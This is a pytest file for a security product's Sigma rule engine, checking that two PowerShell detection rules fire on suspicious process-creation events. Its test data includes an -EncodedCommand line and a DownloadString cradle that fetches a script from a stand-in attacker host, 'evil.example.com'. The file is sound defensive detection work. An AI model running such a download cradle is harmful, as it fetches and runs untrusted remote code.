"""Tests for the 2 PowerShell Sigma rules shipped in v1.4.x.

Both rules depend on the `contains:` substring modifier
support that v1.4.x ships in the Sigma engine (ADR-009).
The rules also exercise the modifier-aware matcher in
end-to-end form (via SigmaRuleRunner) — the previous
"matches" tests in test_sigma_modifiers.py only exercised
the unit-level helpers.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

from .fake_redis import FakeRedis


def _event(source: str, **metadata) -> ParsedEvent:
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source=source,
        raw="",
        metadata=metadata,
        occurred_at=datetime.now(timezone.utc),
    )


def _powershell_rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/windows_eventlog"))


def _find(rules: list, rule_id: str):
    return next(r for r in rules if r.id == rule_id)


# --------------------------------------------------------------------
# T1059.001 EncodedCommand
# --------------------------------------------------------------------


@pytest.mark.asyncio
async def test_t1059_encoded_fires_on_real_payload() -> None:
    rules = _powershell_rules()
    t1059 = _find(rules, "builtin-windows-4688-powershell-encoded")
    runner = SigmaRuleRunner(FakeRedis(), [t1059])
    fires = await runner.evaluate(
        _event(
            "windows.security.4688",
            pid=4321,
            parent_process_name="powershell.exe",
            command_line=(
                "powershell.exe -EncodedCommand "
                "ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="
            ),
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == "builtin-windows-4688-powershell-encoded"
    assert fires[0].rendered_action is not None
    assert fires[0].rendered_action["kind"] == "snapshot_processes"
    assert fires[0].rendered_action["target"] == "4321"


@pytest.mark.asyncio
async def test_t1059_encoded_does_not_fire_on_plain_powershell() -> None:
    rules = _powershell_rules()
    t1059 = _find(rules, "builtin-windows-4688-powershell-encoded")
    runner = SigmaRuleRunner(FakeRedis(), [t1059])
    fires = await runner.evaluate(
        _event(
            "windows.security.4688",
            pid=4321,
            parent_process_name="powershell.exe",
            command_line="powershell.exe -File C:\\script.ps1",
        )
    )
    assert fires == []


# --------------------------------------------------------------------
# T1059.001 / T1105 DownloadString
# --------------------------------------------------------------------


@pytest.mark.asyncio
async def test_t1105_downloadstring_fires() -> None:
    rules = _powershell_rules()
    t1105 = _find(rules, "builtin-windows-4688-powershell-download")
    runner = SigmaRuleRunner(FakeRedis(), [t1105])
    fires = await runner.evaluate(
        _event(
            "windows.security.4688",
            pid=5555,
            parent_process_name="powershell.exe",
            command_line=(
                "powershell.exe (New-Object "
                "Net.WebClient).DownloadString("
                "'http://evil.example.com/payload.ps1')"
            ),
        )
    )
    assert len(fires) == 1
    assert fires[0].rule.id == "builtin-windows-4688-powershell-download"


@pytest.mark.asyncio
async def test_t1105_does_not_fire_on_office_app() -> None:
    """A Word process that doesn't mention DownloadString should not fire."""
    rules = _powershell_rules()
    t1105 = _find(rules, "builtin-windows-4688-powershell-download")
    runner = SigmaRuleRunner(FakeRedis(), [t1105])
    fires = await runner.evaluate(
        _event(
            "windows.security.4688",
            pid=5555,
            parent_process_name="WINWORD.EXE",
            command_line="WINWORD.EXE /n C:\\file.docx",
        )
    )
    assert fires == []
